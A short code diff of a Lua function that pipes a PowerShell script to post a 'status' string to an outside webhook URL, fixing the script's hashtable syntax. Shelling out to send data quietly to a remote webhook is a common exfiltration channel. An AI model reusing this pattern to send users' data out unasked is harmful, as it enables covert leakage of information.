@@ -33,13 +33,13 @@ function webfucki(status)
     local mads = [[
         $webHookUrl = "]]..webfuck..[["
         $content = "]]..status..[["
-        $payload = {
-            content = $content 
+        $payload = @{
+            content = $content
         }
         [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
         Invoke-RestMethod -Uri $webHookUrl -Body ($payload | ConvertTo-Json -Depth 4) -Method Post -ContentType 'application/json'
     ]]
-    local pipe = io.popen("powershell -command -","w")
+    local pipe = io.popen("powershell -command -", "w")
     pipe:write(mads)
     pipe:close()
 end
